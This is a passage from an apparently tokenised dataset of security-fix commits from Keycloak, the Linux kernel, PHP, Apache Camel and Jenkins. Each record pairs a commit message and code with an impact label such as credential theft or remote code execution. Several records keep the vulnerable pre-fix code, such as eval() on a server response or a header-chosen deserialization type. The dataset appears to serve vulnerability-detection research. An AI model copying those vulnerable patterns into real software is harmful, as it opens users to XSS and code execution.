"in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "keycloak", ".", "validation", ";", "import", "org", ".", "keycloak", ".", "provider", ".", "Provider", ";", "import", "org", ".", "keycloak", ".", "provider", ".", "ProviderFactory", ";", "import", "org", ".", "keycloak", ".", "provider", ".", "Spi", ";", "public", "class", "ClientValidationSPI", "implements", "Spi", "{", "@", "Override", "public", "boolean", "isInternal", "(", ")", "{", "return", "true", ";", "}", "@", "Override", "public", "String", "getName", "(", ")", "{", "return", "\"", "clientValidation", "\"", ";", "}", "@", "Override", "public", "Class", "<", "?", "extends", "Provider", ">", "getProviderClass", "(", ")", "{", "return", "ClientValidationProvider", ".", "class", ";", "}", "@", "Override", "public", "Class", "<", "?", "extends", "ProviderFactory", ">", "getProviderFactoryClass", "(", ")", "{", "return", "ClientValidationProviderFactory", ".", "class", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "88", "@", "@", "/", "*", "*", "Copyright", "2019", "Red", "Hat", ",", "Inc", ".", "and", "/", "or", "its", "affiliates", "*", "and", "other", "contributors", "as", "indicated", "by", "the", "@", "author", "tags", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "keycloak", ".", "validation", ";", "import", "org", ".", "keycloak", ".", "models", ".", "ClientModel", ";", "import", "org", ".", "keycloak", ".", "models", ".", "KeycloakSession", ";", "import", "javax", ".", "ws", ".", "rs", ".", "BadRequestException", ";", "public", "class", "ClientValidationUtil", "{", "public", "static", "void", "validate", "(", "KeycloakSession", "session", ",", "ClientModel", "client", ",", "boolean", "create", ",", "ErrorHandler", "errorHandler", ")", "throws", "BadRequestException", "{", "ClientValidationProvider", "provider", "=", "session", ".", "getProvider", "(", "ClientValidationProvider", ".", "class", ")", ";", "if", "(", "provider", "!", "=", "null", ")", "{", "DefaultClientValidationContext", "context", "=", "new", "DefaultClientValidationContext", "(", "create", "?", "ClientValidationContext", ".", "Event", ".", "CREATE", ":", "ClientValidationContext", ".", "Event", ".", "UPDATE", ",", "session", ",", "client", ")", ";", "provider", ".", "validate", "(", "context", ")", ";", "if", "(", "!", "context", ".", "isValid", "(", "))", "{", "errorHandler", ".", "onError", "(", "context", ")", ";", "}", "}", "}", "public", "interface", "ErrorHandler", "{", "void", "onError", "(", "ClientValidationContext", "context", ")", ";", "}", "private", "static", "class", "DefaultClientValidationContext", "implements", "ClientValidationContext", "{", "private", "Event", "event", ";", "private", "KeycloakSession", "session", ";", "private", "ClientModel", "client", ";", "private", "String", "error", ";", "public", "DefaultClientValidationContext", "(", "Event", "event", ",", "KeycloakSession", "session", ",", "ClientModel", "client", ")", "{", "this", ".", "event", "=", "event", ";", "this", ".", "session", "=", "session", ";", "this", ".", "client", "=", "client", ";", "}", "public", "boolean", "isValid", "(", ")", "{", "return", "error", "=", "=", "null", ";", "}", "public", "String", "getError", "(", ")", "{", "return", "error", ";", "}", "@", "Override", "public", "Event", "getEvent", "(", ")", "{", "return", "event", ";", "}", "@", "Override", "public", "KeycloakSession", "getSession", "(", ")", "{", "return", "session", ";", "}", "@", "Override", "public", "ClientModel", "getClient", "(", ")", "{", "return", "client", ";", "}", "@", "Override", "public", "ClientValidationContext", "invalid", "(", "String", "error", ")", "{", "this", ".", "error", "=", "error", ";", "return", "this", ";", "}", "}", "}", "@", "@", "-", "77", ",", "4", "+", "77", ",", "5", "@", "@", "org", ".", "keycloak", ".", "crypto", ".", "ClientSignatureVerifierSpi", "org", ".", "keycloak", ".", "crypto", ".", "ContentEncryptionSpi", "org", ".", "keycloak", ".", "validation", ".", "ClientValidationSPI", "import", "org", ".", "keycloak", ".", "validation", ".", "ClientValidationUtil", ";", "ClientValidationUtil", ".", "validate", "(", "session", ",", "clientModel", ",", "true", ",", "c", "-", ">", "{", "session", ".", "getTransactionManager", "(", ").", "setRollbackOnly", "(", ");", "throw", "new", "ErrorResponseException", "(", "ErrorCodes", ".", "INVALID_CLIENT_METADATA", ",", "c", ".", "getError", "(", "),", "Response", ".", "Status", ".", "BAD_REQUEST", ")", ";", "}", ");", "ClientValidationUtil", ".", "validate", "(", "session", ",", "client", ",", "false", ",", "c", "-", ">", "{", "session", ".", "getTransactionManager", "(", ").", "setRollbackOnly", "(", ");", "throw", "new", "ErrorResponseException", "(", "ErrorCodes", ".", "INVALID_CLIENT_METADATA", ",", "c", ".", "getError", "(", "),", "Response", ".", "Status", ".", "BAD_REQUEST", ")", ";", "}", ");", "import", "org", ".", "keycloak", ".", "events", ".", "Errors", ";", "import", "org", ".", "keycloak", ".", "validation", ".", "ClientValidationUtil", ";", "ClientValidationUtil", ".", "validate", "(", "session", ",", "client", ",", "false", ",", "c", "-", ">", "{", "session", ".", "getTransactionManager", "(", ").", "setRollbackOnly", "(", ");", "throw", "new", "ErrorResponseException", "(", "Errors", ".", "INVALID_INPUT", ",", "c", ".", "getError", "(", "),", "Response", ".", "Status", ".", "BAD_REQUEST", ")", ";", "}", ");", "return", "ErrorResponse", ".", "exists", "(", "\"", "Client", "already", "exists", "\"", ");", "import", "org", ".", "keycloak", ".", "events", ".", "Errors", ";", "import", "org", ".", "keycloak", ".", "validation", ".", "ClientValidationUtil", ";", "ClientValidationUtil", ".", "validate", "(", "session", ",", "clientModel", ",", "true", ",", "c", "-", ">", "{", "session", ".", "getTransactionManager", "(", ").", "setRollbackOnly", "(", ");", "throw", "new", "ErrorResponseException", "(", "Errors", ".", "INVALID_INPUT", ",", "c", ".", "getError", "(", "),", "Response", ".", "Status", ".", "BAD_REQUEST", ")", ";", "}", ");", "/", "*", "*", "Copyright", "2019", "Red", "Hat", ",", "Inc", ".", "and", "/", "or", "its", "affiliates", "*", "and", "other", "contributors", "as", "indicated", "by", "the", "@", "author", "tags", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "keycloak", ".", "validation", ";", "import", "org", ".", "keycloak", ".", "models", ".", "ClientModel", ";", "import", "org", ".", "keycloak", ".", "services", ".", "util", ".", "ResolveRelative", ";", "import", "java", ".", "net", ".", "MalformedURLException", ";", "import", "java", ".", "net", ".", "URI", ";", "import", "java", ".", "net", ".", "URISyntaxException", ";", "import", "java", ".", "net", ".", "URL", ";", "public", "class", "DefaultClientValidationProvider", "implements", "ClientValidationProvider", "{", "private", "ClientValidationContext", "context", ";", "/", "/", "TODO", "Before", "adding", "more", "validation", "consider", "using", "a", "library", "for", "validation", "@", "Override", "public", "void", "validate", "(", "ClientValidationContext", "context", ")", "{", "this", ".", "context", "=", "context", ";", "try", "{", "validate", "(", "context", ".", "getClient", "(", "))", ";", "}", "catch", "(", "ValidationException", "e", ")", "{", "context", ".", "invalid", "(", "e", ".", "getMessage", "(", "))", ";", "}", "}", "private", "void", "validate", "(", "ClientModel", "client", ")", "throws", "ValidationException", "{", "String", "resolvedRootUrl", "=", "ResolveRelative", ".", "resolveRootUrl", "(", "context", ".", "getSession", "(", "),", "client", ".", "getRootUrl", "(", "))", ";", "String", "resolvedBaseUrl", "=", "ResolveRelative", ".", "resolveRelativeUri", "(", "context", ".", "getSession", "(", "),", "resolvedRootUrl", ",", "client", ".", "getBaseUrl", "(", "))", ";", "validateRootUrl", "(", "resolvedRootUrl", ")", ";", "validateBaseUrl", "(", "resolvedBaseUrl", ")", ";", "}", "private", "void", "validateRootUrl", "(", "String", "rootUrl", ")", "throws", "ValidationException", "{", "if", "(", "rootUrl", "!", "=", "null", "&", "&", "!", "rootUrl", ".", "isEmpty", "(", "))", "{", "basicHttpUrlCheck", "(", "\"", "rootUrl", "\"", ",", "rootUrl", ")", ";", "}", "}", "private", "void", "validateBaseUrl", "(", "String", "baseUrl", ")", "throws", "ValidationException", "{", "if", "(", "baseUrl", "!", "=", "null", "&", "&", "!", "baseUrl", ".", "isEmpty", "(", "))", "{", "basicHttpUrlCheck", "(", "\"", "baseUrl", "\"", ",", "baseUrl", ")", ";", "}", "}", "private", "void", "basicHttpUrlCheck", "(", "String", "field", ",", "String", "url", ")", "throws", "ValidationException", "{", "boolean", "valid", "=", "true", ";", "try", "{", "URI", "uri", "=", "new", "URL", "(", "url", ")", ".", "toURI", "(", ");", "if", "(", "uri", ".", "getScheme", "(", ")", "=", "=", "null", "|", "|", "uri", ".", "getScheme", "(", ").", "isEmpty", "(", "))", "{", "valid", "=", "false", ";", "}", "}", "catch", "(", "MalformedURLException", "|", "URISyntaxException", "e", ")", "{", "valid", "=", "false", ";", "}", "if", "(", "!", "valid", ")", "{", "throw", "new", "ValidationException", "(", "\"", "Invalid", "URL", "in", "\"", "+", "field", ")", ";", "}", "}", "class", "ValidationException", "extends", "Exception", "{", "public", "ValidationException", "(", "String", "message", ")", "{", "super", "(", "message", ",", "null", ",", "false", ",", "false", ")", ";", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "35", "@", "@", "/", "*", "*", "Copyright", "2019", "Red", "Hat", ",", "Inc", ".", "and", "/", "or", "its", "affiliates", "*", "and", "other", "contributors", "as", "indicated", "by", "the", "@", "author", "tags", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "keycloak", ".", "validation", ";", "import", "org", ".", "keycloak", ".", "models", ".", "KeycloakSession", ";", "public", "class", "DefaultClientValidationProviderFactory", "implements", "ClientValidationProviderFactory", "{", "private", "final", "DefaultClientValidationProvider", "provider", "=", "new", "DefaultClientValidationProvider", "(", ");", "@", "Override", "public", "ClientValidationProvider", "create", "(", "KeycloakSession", "session", ")", "{", "return", "provider", ";", "}", "@", "Override", "public", "String", "getId", "(", ")", "{", "return", "\"", "default", "\"", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", "@", "@", "org", ".", "keycloak", ".", "validation", ".", "DefaultClientValidationProviderFactory", "@", "Test", "public", "void", "createClientValidation", "(", ")", "{", "ClientRepresentation", "rep", "=", "new", "ClientRepresentation", "(", ");", "rep", ".", "setClientId", "(", "\"", "my", "-", "app", "\"", ");", "rep", ".", "setDescription", "(", "\"", "my", "-", "app", "description", "\"", ");", "rep", ".", "setEnabled", "(", "true", ")", ";", "rep", ".", "setRootUrl", "(", "\"", "invalid", "\"", ");", "createClientExpectingValidationError", "(", "rep", ",", "\"", "Invalid", "URL", "in", "rootUrl", "\"", ");", "rep", ".", "setRootUrl", "(", "null", ")", ";", "rep", ".", "setBaseUrl", "(", "\"", "invalid", "\"", ");", "createClientExpectingValidationError", "(", "rep", ",", "\"", "Invalid", "URL", "in", "baseUrl", "\"", ");", "}", "@", "Test", "public", "void", "updateClientValidation", "(", ")", "{", "ClientRepresentation", "rep", "=", "createClient", "(", ");", "rep", ".", "setClientId", "(", "\"", "my", "-", "app", "\"", ");", "rep", ".", "setDescription", "(", "\"", "my", "-", "app", "description", "\"", ");", "rep", ".", "setEnabled", "(", "true", ")", ";", "rep", ".", "setRootUrl", "(", "\"", "invalid", "\"", ");", "updateClientExpectingValidationError", "(", "rep", ",", "\"", "Invalid", "URL", "in", "rootUrl", "\"", ");", "rep", ".", "setRootUrl", "(", "null", ")", ";", "rep", ".", "setBaseUrl", "(", "\"", "invalid", "\"", ");", "updateClientExpectingValidationError", "(", "rep", ",", "\"", "Invalid", "URL", "in", "baseUrl", "\"", ");", "ClientRepresentation", "stored", "=", "realm", ".", "clients", "(", ").", "get", "(", "rep", ".", "getId", "(", "))", ".", "toRepresentation", "(", ");", "assertNull", "(", "stored", ".", "getRootUrl", "(", "))", ";", "assertNull", "(", "stored", ".", "getBaseUrl", "(", "))", ";", "}", "private", "void", "createClientExpectingValidationError", "(", "ClientRepresentation", "rep", ",", "String", "expectedError", ")", "{", "Response", "response", "=", "realm", ".", "clients", "(", ").", "create", "(", "rep", ")", ";", "assertEquals", "(", "400", ",", "response", ".", "getStatus", "(", "))", ";", "OAuth2ErrorRepresentation", "error", "=", "response", ".", "readEntity", "(", "OAuth2ErrorRepresentation", ".", "class", ")", ";", "assertEquals", "(", "\"", "invalid_input", "\"", ",", "error", ".", "getError", "(", "))", ";", "assertEquals", "(", "expectedError", ",", "error", ".", "getErrorDescription", "(", "))", ";", "assertNull", "(", "response", ".", "getLocation", "(", "))", ";", "response", ".", "close", "(", ");", "}", "private", "void", "updateClientExpectingValidationError", "(", "ClientRepresentation", "rep", ",", "String", "expectedError", ")", "{", "try", "{", "realm", ".", "clients", "(", ").", "get", "(", "rep", ".", "getId", "(", "))", ".", "update", "(", "rep", ")", ";", "fail", "(", "\"", "Expected", "exception", "\"", ");", "}", "catch", "(", "BadRequestException", "e", ")", "{", "Response", "response", "=", "e", ".", "getResponse", "(", ");", "assertEquals", "(", "400", ",", "response", ".", "getStatus", "(", "))", ";", "OAuth2ErrorRepresentation", "error", "=", "response", ".", "readEntity", "(", "OAuth2ErrorRepresentation", ".", "class", ")", ";", "assertEquals", "(", "\"", "invalid_input", "\"", ",", "error", ".", "getError", "(", "))", ";", "assertEquals", "(", "expectedError", ",", "error", ".", "getErrorDescription", "(", "))", ";", "}", "}", "clientRep", ".", "setProtocol", "(", "\"", "openid", "-", "connect", "\"", ");", "import", "org", ".", "keycloak", ".", "representations", ".", "idm", ".", "OAuth2ErrorRepresentation", ";", "import", "org", ".", "keycloak", ".", "services", ".", "clientregistration", ".", "ErrorCodes", ";", "import", "org", ".", "keycloak", ".", "util", ".", "JsonSerialization", ";", "import", "java", ".", "io", ".", "IOException", ";", "@", "Test", "public", "void", "registerClientValidation", "(", ")", "throws", "IOException", "{", "authCreateClients", "(", ");", "ClientRepresentation", "client", "=", "buildClient", "(", ");", "client", ".", "setRootUrl", "(", "\"", "invalid", "\"", ");", "try", "{", "registerClient", "(", "client", ")", ";", "}", "catch", "(", "ClientRegistrationException", "e", ")", "{", "HttpErrorException", "c", "=", "(", "HttpErrorException", ")", "e", ".", "getCause", "(", ");", "assertEquals", "(", "400", ",", "c", ".", "getStatusLine", "(", ").", "getStatusCode", "(", "))", ";", "OAuth2ErrorRepresentation", "error", "=", "JsonSerialization", ".", "readValue", "(", "c", ".", "getErrorResponse", "(", "),", "OAuth2ErrorRepresentation", ".", "class", ")", ";", "assertEquals", "(", "\"", "invalid_client_metadata", "\"", ",", "error", ".", "getError", "(", "))", ";", "assertEquals", "(", "\"", "Invalid", "URL", "in", "rootUrl", "\"", ",", "error", ".", "getErrorDescription", "(", "))", ";", "}", "}", "@", "Test", "public", "void", "updateClientValidation", "(", ")", "throws", "IOException", ",", "ClientRegistrationException", "{", "registerClientAsAdmin", "(", ");", "ClientRepresentation", "client", "=", "reg", ".", "get", "(", "CLIENT_ID", ")", ";", "client", ".", "setRootUrl", "(", "\"", "invalid", "\"", ");", "try", "{", "reg", ".", "update", "(", "client", ")", ";", "}", "catch", "(", "ClientRegistrationException", "e", ")", "{", "HttpErrorException", "c", "=", "(", "HttpErrorException", ")", "e", ".", "getCause", "(", ");", "assertEquals", "(", "400", ",", "c", ".", "getStatusLine", "(", ").", "getStatusCode", "(", "))", ";", "OAuth2ErrorRepresentation", "error", "=", "JsonSerialization", ".", "readValue", "(", "c", ".", "getErrorResponse", "(", "),", "OAuth2ErrorRepresentation", ".", "class", ")", ";", "assertEquals", "(", "\"", "invalid_client_metadata", "\"", ",", "error", ".", "getError", "(", "))", ";", "assertEquals", "(", "\"", "Invalid", "URL", "in", "rootUrl", "\"", ",", "error", ".", "getErrorDescription", "(", "))", ";", "}", "ClientRepresentation", "updatedClient", "=", "reg", ".", "get", "(", "CLIENT_ID", ")", ";", "assertNull", "(", "updatedClient", ".", "getRootUrl", "(", "))", ";", "}</s>org", ".", "keycloak", ".", "crypto", ".", "ContentEncryptionSpi", "return", "ErrorResponse", ".", "exists", "(", "\"", "Client", "\"", "+", "rep", ".", "getClientId", "(", ")", "+", "\"", "already", "exists", "\"", ");", "clientRep", ".", "setRootUrl", "(", "\"", "foo", "\"", ");", "clientRep", ".", "setProtocol", "(", "\"", "openid", "-", "connect", "\"", ");", "clientRep", ".", "setRootUrl", "(", "\"", "foo", "\"", ");", "client", ".", "setRootUrl", "(", "\"", "foo", "\"", ");", "client", ".", "setRootUrl", "(", "\"", "foo", "\"", ");"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
{"contents": ["NFS:", "Fix", "an", "Oops", "when", "truncating", "a", "file", "The", "VM/VFS", "does", "not", "allow", "mapping->a_ops->invalidatepage()", "to", "fail.", "Unfortunately,", "nfs_wb_page_cancel()", "may", "fail", "if", "a", "fatal", "signal", "occurs.", "Since", "the", "NFS", "code", "assumes", "that", "the", "page", "stays", "mapped", "for", "as", "long", "as", "the", "writeback", "is", "active,", "we", "can", "end", "up", "Oopsing", "(among", "other", "things).", "The", "only", "safe", "fix", "here", "is", "to", "convert", "nfs_wait_on_request(),", "so", "as", "to", "make", "it", "uninterruptible", "(as", "is", "already", "the", "case", "with", "wait_on_page_writeback()).", "Signed-off-by:", "Trond", "Myklebust", "<Trond.Myklebust@netapp.com>", "Cc:", "stable@kernel.org"], "code_tokens": ["static", "int", "nfs_wait_bit_uninterruptible", "(", "void", "*", "word", ")", "{", "io_schedule", "(", ");", "return", "0", ";", "}", "return", "wait_on_bit", "(", "&", "req", "-", ">", "wb_flags", ",", "PG_BUSY", ",", "nfs_wait_bit_uninterruptible", ",", "TASK_UNINTERRUPTIBLE", ")", ";</s>int", "ret", "=", "0", ";", "if", "(", "!", "test_bit", "(", "PG_BUSY", ",", "&", "req", "-", ">", "wb_flags", ")", ")", "goto", "out", ";", "ret", "=", "out_of_line_wait_on_bit", "(", "&", "req", "-", ">", "wb_flags", ",", "PG_BUSY", ",", "nfs_wait_bit_killable", ",", "TASK_KILLABLE", ")", ";", "out", ":", "return", "ret", ";"], "docstring_tokens": ["information", "leak"]}
{"contents": ["FIx", "bug", "#68618", "(out", "of", "bounds", "read", "crashes", "php-cgi)"], "code_tokens": ["-", "CGI", ":", ".", "Fix", "bug", "#", "68618", "(", "out", "of", "bounds", "read", "crashes", "php", "-", "cgi", ")", ".", "(", "Stas", ")", "while", "(", "c", "!", "=", "'", "\\", "n", "'", "&", "&", "c", "!", "=", "'", "\\", "r", "'", "&", "&", "i", "<", "file_handle", ".", "handle", ".", "stream", ".", "mmap", ".", "len", ")", "{", "if", "(", "i", "<", "file_handle", ".", "handle", ".", "stream", ".", "mmap", ".", "len", "&", "&", "file_handle", ".", "handle", ".", "stream", ".", "mmap", ".", "buf", "[", "i", "]", "=", "=", "'", "\\", "n", "'", ")", "{", "if", "(", "i", ">", "file_handle", ".", "handle", ".", "stream", ".", "mmap", ".", "len", ")", "{", "i", "=", "file_handle", ".", "handle", ".", "stream", ".", "mmap", ".", "len", ";", "}</s>while", "(", "c", "!", "=", "'", "\\", "n", "'", "&", "&", "c", "!", "=", "'", "\\", "r", "'", "&", "&", "c", "!", "=", "EOF", ")", "{", "if", "(", "file_handle", ".", "handle", ".", "stream", ".", "mmap", ".", "buf", "[", "i", "]", "=", "=", "'", "\\", "n", "'", ")", "{"], "docstring_tokens": ["print", "characters", "that", "were", "not", "actually", "present", "in", "the", "uploaded", "file"]}
{"contents": ["CAMEL-10604", "-", "Camel-JacksonXML:", "Add", "an", "option", "to", "allow", "the", "UnmarshallType", "header", "use"], "code_tokens": ["@", "XmlAttribute", "private", "Boolean", "allowUnmarshallType", ";", "public", "Boolean", "getAllowUnmarshallType", "(", ")", "{", "return", "allowUnmarshallType", ";", "}", "/", "**", "*", "If", "enabled", "then", "Jackson", "is", "allowed", "to", "attempt", "to", "use", "the", "CamelJacksonUnmarshalType", "header", "during", "the", "unmarshalling", ".", "*", "<", "p", "/", ">", "*", "This", "should", "only", "be", "enabled", "when", "desired", "to", "be", "used", ".", "*", "/", "public", "void", "setAllowUnmarshallType", "(", "Boolean", "allowUnmarshallType", ")", "{", "this", ".", "allowUnmarshallType", "=", "allowUnmarshallType", ";", "}", "if", "(", "allowUnmarshallType", "!", "=", "null", ")", "{", "setProperty", "(", "camelContext", ",", "dataFormat", ",", "\"", "allowUnmarshallType", "\"", ",", "allowUnmarshallType", ")", ";", "}", "private", "boolean", "allowUnmarshallType", ";", "String", "type", "=", "null", ";", "if", "(", "allowUnmarshallType", ")", "{", "type", "=", "exchange", ".", "getIn", "(", ").", "getHeader", "(", "JacksonXMLConstants", ".", "UNMARSHAL_TYPE", ",", "String", ".", "class", ")", ";", "}", "public", "boolean", "isAllowUnmarshallType", "(", ")", "{", "return", "allowUnmarshallType", ";", "}", "/", "**", "*", "If", "enabled", "then", "Jackson", "is", "allowed", "to", "attempt", "to", "use", "the", "CamelJacksonUnmarshalType", "header", "during", "the", "unmarshalling", ".", "*", "<", "p", "/", ">", "*", "This", "should", "only", "be", "enabled", "when", "desired", "to", "be", "used", ".", "*", "/", "public", "void", "setAllowUnmarshallType", "(", "boolean", "allowJacksonUnmarshallType", ")", "{", "this", ".", "allowUnmarshallType", "=", "allowJacksonUnmarshallType", ";", "}", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "jacksonxml", ";", "import", "java", ".", "util", ".", "LinkedHashMap", ";", "import", "org", ".", "apache", ".", "camel", ".", "builder", ".", "RouteBuilder", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "mock", ".", "MockEndpoint", ";", "import", "org", ".", "apache", ".", "camel", ".", "test", ".", "junit4", ".", "CamelTestSupport", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "JacksonMarshalUnmarshalTypeHeaderNotAllowedTest", "extends", "CamelTestSupport", "{", "@", "Test", "public", "void", "testUnmarshalPojo", "(", ")", "throws", "Exception", "{", "MockEndpoint", "mock", "=", "getMockEndpoint", "(", "\"", "mock", ":", "reversePojo", "\"", ");", "mock", ".", "expectedMessageCount", "(", "1", ")", ";", "String", "json", "=", "\"", "<", "pojo", "name", "=", "\\\"", "Camel", "\\", "\"/", ">\"", ";", "template", ".", "sendBodyAndHeader", "(", "\"", "direct", ":", "backPojo", "\"", ",", "json", ",", "JacksonXMLConstants", ".", "UNMARSHAL_TYPE", ",", "TestPojo", ".", "class", ".", "getName", "(", "))", ";", "assertMockEndpointsSatisfied", "(", ");", "}", "@", "Override", "protected", "RouteBuilder", "createRouteBuilder", "(", ")", "throws", "Exception", "{", "return", "new", "RouteBuilder", "(", ")", "{", "@", "Override", "public", "void", "configure", "(", ")", "throws", "Exception", "{", "JacksonXMLDataFormat", "format", "=", "new", "JacksonXMLDataFormat", "(", ");", "from", "(", "\"", "direct", ":", "backPojo", "\"", ").", "unmarshal", "(", "format", ")", ".", "to", "(", "\"", "mock", ":", "reversePojo", "\"", ");", "}", "}", ";", "}", "}", "@", "@", "-", "46", ",", "6", "+", "46", ",", "7", "@", "@", "protected", "RouteBuilder", "createRouteBuilder", "(", ")", "throws", "Exception", "{", "format", ".", "setAllowUnmarshallType", "(", "true", ")", ";</s>String", "type", "=", "exchange", ".", "getIn", "(", ").", "getHeader", "(", "JacksonXMLConstants", ".", "UNMARSHAL_TYPE", ",", "String", ".", "class", ")", ";"], "docstring_tokens": ["in", "the", "worst", "case", "trigger", "command", "or", "remote", "code", "execution"]}
{"contents": ["[SECURITY-944]"], "code_tokens": ["import", "hudson", ".", "Util", ";", "/", "/", "due", "to", "SimileAjax", ".", "HTML", ".", "deEntify", "(", "in", "simile", "-", "ajax", "-", "bundle", ".", "js", ")", ",", "\"", "&", "lt", ";", "\"", "are", "transformed", "back", "to", "\"", "<\"", ",", "but", "not", "the", "\"", "&#", "60", "\"", ";", "/", "/", "to", "protect", "against", "XSS", "e", ".", "title", "=", "Util", ".", "escape", "(", "r", ".", "getFullDisplayName", "(", "))", ".", "replace", "(", "\"&", "lt", ";", "\",", "\"", "&#", "60", ";", "\")", ";", "eventSource1", ".", "loadJSON", "(", "JSON", ".", "parse", "(", "t", ".", "responseText", ")", ",'", ".'", ");</s>e", ".", "title", "=", "r", ".", "getFullDisplayName", "(", ");", "eventSource1", ".", "loadJSON", "(", "eval", "(", "'(", "'+", "t", ".", "responseText", "+", "')", "')", ",'", ".'", ");"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
{"contents": ["Capabilities:", "move", "cap_file_mmap", "to", "commoncap.c", "Currently", "we", "duplicate", "the", "mmap_min_addr", "test", "in", "cap_file_mmap", "and", "in", "security_file_mmap", "if", "!CONFIG_SECURITY.", "This", "patch", "moves", "cap_file_mmap", "into", "commoncap.c", "and", "then", "calls", "that", "function", "directly", "from", "security_file_mmap", "ifndef", "CONFIG_SECURITY", "like", "all", "of", "the", "other", "capability", "checks", "are", "done.", "Signed-off-by:", "Eric", "Paris", "<eparis@redhat.com>", "Acked-by:", "Serge", "Hallyn", "<serue@us.ibm.com>", "Signed-off-by:", "James", "Morris", "<jmorris@namei.org>"], "code_tokens": ["extern", "int", "cap_file_mmap", "(", "struct", "file", "*", "file", ",", "unsigned", "long", "reqprot", ",", "unsigned", "long", "prot", ",", "unsigned", "long", "flags", ",", "unsigned", "long", "addr", ",", "unsigned", "long", "addr_only", ")", ";", "return", "cap_file_mmap", "(", "file", ",", "reqprot", ",", "prot", ",", "flags", ",", "addr", ",", "addr_only", ")", ";", "/", "*", "*", "cap_file_mmap", "-", "check", "if", "able", "to", "map", "given", "addr", "*", "@", "file", ":", "unused", "*", "@", "reqprot", ":", "unused", "*", "@", "prot", ":", "unused", "*", "@", "flags", ":", "unused", "*", "@", "addr", ":", "address", "attempting", "to", "be", "mapped", "*", "@", "addr_only", ":", "unused", "*", "*", "If", "the", "process", "is", "attempting", "to", "map", "memory", "below", "mmap_min_addr", "they", "need", "*", "CAP_SYS_RAWIO", ".", 